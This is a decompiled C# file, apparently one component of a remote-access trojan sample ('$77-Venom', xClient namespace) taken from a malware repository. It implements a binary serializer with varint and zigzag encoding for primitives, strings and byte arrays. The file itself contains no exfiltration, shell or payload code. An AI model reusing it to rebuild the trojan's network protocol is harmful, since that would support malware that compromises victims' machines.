// Decompiled with JetBrains decompiler
// Type: xClient.Core.NetSerializer.Primitives
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using System;
using System.IO;
using System.Reflection;
using System.Text;

namespace xClient.Core.NetSerializer
{
  public static class Primitives
  {
    [ThreadStatic]
    private static Primitives.StringHelper s_stringHelper;
    private static readonly byte[] s_emptyByteArray = new byte[0];

    public static MethodInfo GetWritePrimitive(Type type) => typeof (Primitives).GetMethod("WritePrimitive", BindingFlags.Static | BindingFlags.Public | BindingFlags.ExactBinding, (Binder) null, new Type[2]
    {
      typeof (Stream),
      type
    }, (ParameterModifier[]) null);

    public static MethodInfo GetReaderPrimitive(Type type) => typeof (Primitives).GetMethod("ReadPrimitive", BindingFlags.Static | BindingFlags.Public | BindingFlags.ExactBinding, (Binder) null, new Type[2]
    {
      typeof (Stream),
      type.MakeByRefType()
    }, (ParameterModifier[]) null);

    private static uint EncodeZigZag32(int n) => (uint) (n << 1 ^ n >> 31);

    private static ulong EncodeZigZag64(long n) => (ulong) (n << 1 ^ n >> 63);

    private static int DecodeZigZag32(uint n) => (int) (n >> 1) ^ -((int) n & 1);

    private static long DecodeZigZag64(ulong n) => (long) (n >> 1) ^ -((long) n & 1L);

    private static uint ReadVarint32(Stream stream)
    {
      int num1 = 0;
      for (int index = 0; index < 32; index += 7)
      {
        int num2 = stream.ReadByte();
        if (num2 == -1)
          throw new EndOfStreamException();
        num1 |= (num2 & (int) sbyte.MaxValue) << index;
        if ((num2 & 128) == 0)
          return (uint) num1;
      }
      throw new InvalidDataException();
    }

    private static void WriteVarint32(Stream stream, uint value)
    {
      for (; value >= 128U; value >>= 7)
        stream.WriteByte((byte) (value | 128U));
      stream.WriteByte((byte) value);
    }

    private static ulong ReadVarint64(Stream stream)
    {
      long num1 = 0;
      for (int index = 0; index < 64; index += 7)
      {
        int num2 = stream.ReadByte();
        if (num2 == -1)
          throw new EndOfStreamException();
        num1 |= (long) (num2 & (int) sbyte.MaxValue) << index;
        if ((num2 & 128) == 0)
          return (ulong) num1;
      }
      throw new InvalidDataException();
    }

    private static void WriteVarint64(Stream stream, ulong value)
    {
      for (; value >= 128UL; value >>= 7)
        stream.WriteByte((byte) (value | 128UL));
      stream.WriteByte((byte) value);
    }

    public static void WritePrimitive(Stream stream, bool value) => stream.WriteByte(value ? (byte) 1 : (byte) 0);

    public static void ReadPrimitive(Stream stream, out bool value)
    {
      int num = stream.ReadByte();
      value = num != 0;
    }

    public static void WritePrimitive(Stream stream, byte value) => stream.WriteByte(value);

    public static void ReadPrimitive(Stream stream, out byte value) => value = (byte) stream.ReadByte();

    public static void WritePrimitive(Stream stream, sbyte value) => stream.WriteByte((byte) value);

    public static void ReadPrimitive(Stream stream, out sbyte value) => value = (sbyte) stream.ReadByte();

    public static void WritePrimitive(Stream stream, char value) => Primitives.WriteVarint32(stream, (uint) value);

    public static void ReadPrimitive(Stream stream, out char value) => value = (char) Primitives.ReadVarint32(stream);

    public static void WritePrimitive(Stream stream, ushort value) => Primitives.WriteVarint32(stream, (uint) value);

    public static void ReadPrimitive(Stream stream, out ushort value) => value = (ushort) Primitives.ReadVarint32(stream);

    public static void WritePrimitive(Stream stream, short value) => Primitives.WriteVarint32(stream, Primitives.EncodeZigZag32((int) value));

    public static void ReadPrimitive(Stream stream, out short value) => value = (short) Primitives.DecodeZigZag32(Primitives.ReadVarint32(stream));

    public static void WritePrimitive(Stream stream, uint value) => Primitives.WriteVarint32(stream, value);

    public static void ReadPrimitive(Stream stream, out uint value) => value = Primitives.ReadVarint32(stream);

    public static void WritePrimitive(Stream stream, int value) => Primitives.WriteVarint32(stream, Primitives.EncodeZigZag32(value));

    public static void ReadPrimitive(Stream stream, out int value) => value = Primitives.DecodeZigZag32(Primitives.ReadVarint32(stream));

    public static void WritePrimitive(Stream stream, ulong value) => Primitives.WriteVarint64(stream, value);

    public static void ReadPrimitive(Stream stream, out ulong value) => value = Primitives.ReadVarint64(stream);

    public static void WritePrimitive(Stream stream, long value) => Primitives.WriteVarint64(stream, Primitives.EncodeZigZag64(value));

    public static void ReadPrimitive(Stream stream, out long value) => value = Primitives.DecodeZigZag64(Primitives.ReadVarint64(stream));

    public static unsafe void WritePrimitive(Stream stream, float value)
    {
      uint num = *(uint*) &value;
      Primitives.WriteVarint32(stream, num);
    }

    public static unsafe void ReadPrimitive(Stream stream, out float value)
    {
      uint num = Primitives.ReadVarint32(stream);
      value = *(float*) &num;
    }

    public static unsafe void WritePrimitive(Stream stream, double value)
    {
      ulong num = (ulong) *(long*) &value;
      Primitives.WriteVarint64(stream, num);
    }

    public static unsafe void ReadPrimitive(Stream stream, out double value)
    {
      ulong num = Primitives.ReadVarint64(stream);
      value = *(double*) &num;
    }

    public static void WritePrimitive(Stream stream, DateTime value)
    {
      long binary = value.ToBinary();
      Primitives.WritePrimitive(stream, binary);
    }

    public static void ReadPrimitive(Stream stream, out DateTime value)
    {
      long dateData;
      Primitives.ReadPrimitive(stream, out dateData);
      value = DateTime.FromBinary(dateData);
    }

    public static unsafe void WritePrimitive(Stream stream, string value)
    {
      switch (value)
      {
        case "":
          Primitives.WritePrimitive(stream, 1U);
          break;
        case null:
          Primitives.WritePrimitive(stream, 0U);
          break;
        default:
          Primitives.StringHelper stringHelper = Primitives.s_stringHelper;
          if (stringHelper == null)
            Primitives.s_stringHelper = stringHelper = new Primitives.StringHelper();
          Encoder encoder = stringHelper.Encoder;
          byte[] byteBuffer = stringHelper.ByteBuffer;
          int length = value.Length;
          int byteCount;
          fixed (char* chars = value)
            byteCount = encoder.GetByteCount(chars, length, true);
          Primitives.WritePrimitive(stream, (uint) (byteCount + 1));
          Primitives.WritePrimitive(stream, (uint) length);
          int num = 0;
          bool completed = false;
          while (!completed)
          {
            int charsUsed;
            int bytesUsed;
            fixed (char* chPtr = value)
              fixed (byte* bytes = byteBuffer)
                encoder.Convert(chPtr + num, length - num, bytes, byteBuffer.Length, true, out charsUsed, out bytesUsed, out completed);
            stream.Write(byteBuffer, 0, bytesUsed);
            num += charsUsed;
          }
          break;
      }
    }

    public static void ReadPrimitive(Stream stream, out string value)
    {
      uint num1;
      Primitives.ReadPrimitive(stream, out num1);
      if (num1 == 0U)
        value = (string) null;
      else if (num1 == 1U)
      {
        value = string.Empty;
      }
      else
      {
        uint num2 = num1 - 1U;
        uint length;
        Primitives.ReadPrimitive(stream, out length);
        Primitives.StringHelper stringHelper = Primitives.s_stringHelper;
        if (stringHelper == null)
          Primitives.s_stringHelper = stringHelper = new Primitives.StringHelper();
        Decoder decoder = stringHelper.Decoder;
        byte[] byteBuffer = stringHelper.ByteBuffer;
        char[] chars = length > 128U ? new char[(int) length] : stringHelper.CharBuffer;
        int val2 = (int) num2;
        int charIndex = 0;
        while (val2 > 0)
        {
          int num3 = stream.Read(byteBuffer, 0, Math.Min(byteBuffer.Length, val2));
          if (num3 == 0)
            throw new EndOfStreamException();
          val2 -= num3;
          bool flush = val2 == 0;
          bool completed = false;
          int byteIndex = 0;
          while (!completed)
          {
            int bytesUsed;
            int charsUsed;
            decoder.Convert(byteBuffer, byteIndex, num3 - byteIndex, chars, charIndex, (int) length - charIndex, flush, out bytesUsed, out charsUsed, out completed);
            byteIndex += bytesUsed;
            charIndex += charsUsed;
          }
        }
        value = new string(chars, 0, (int) length);
      }
    }

    public static void WritePrimitive(Stream stream, byte[] value)
    {
      if (value == null)
      {
        Primitives.WritePrimitive(stream, 0U);
      }
      else
      {
        Primitives.WritePrimitive(stream, (uint) (value.Length + 1));
        stream.Write(value, 0, value.Length);
      }
    }

    public static void ReadPrimitive(Stream stream, out byte[] value)
    {
      uint num1;
      Primitives.ReadPrimitive(stream, out num1);
      if (num1 == 0U)
        value = (byte[]) null;
      else if (num1 == 1U)
      {
        value = Primitives.s_emptyByteArray;
      }
      else
      {
        uint length = num1 - 1U;
        value = new byte[(int) length];
        int num2;
        for (int offset = 0; (long) offset < (long) length; offset += num2)
        {
          num2 = stream.Read(value, offset, (int) length - offset);
          if (num2 == 0)
            throw new EndOfStreamException();
        }
      }
    }

    private sealed class StringHelper
    {
      public const int BYTEBUFFERLEN = 256;
      public const int CHARBUFFERLEN = 128;
      private Encoder m_encoder;
      private Decoder m_decoder;
      private byte[] m_byteBuffer;
      private char[] m_charBuffer;

      public StringHelper() => this.Encoding = new UTF8Encoding(false, true);

      public UTF8Encoding Encoding { get; private set; }

      public Encoder Encoder
      {
        get
        {
          if (this.m_encoder == null)
            this.m_encoder = this.Encoding.GetEncoder();
          return this.m_encoder;
        }
      }

      public Decoder Decoder
      {
        get
        {
          if (this.m_decoder == null)
            this.m_decoder = this.Encoding.GetDecoder();
          return this.m_decoder;
        }
      }

      public byte[] ByteBuffer
      {
        get
        {
          if (this.m_byteBuffer == null)
            this.m_byteBuffer = new byte[256];
          return this.m_byteBuffer;
        }
      }

      public char[] CharBuffer
      {
        get
        {
          if (this.m_charBuffer == null)
            this.m_charBuffer = new char[128];
          return this.m_charBuffer;
        }
      }
    }
  }
}
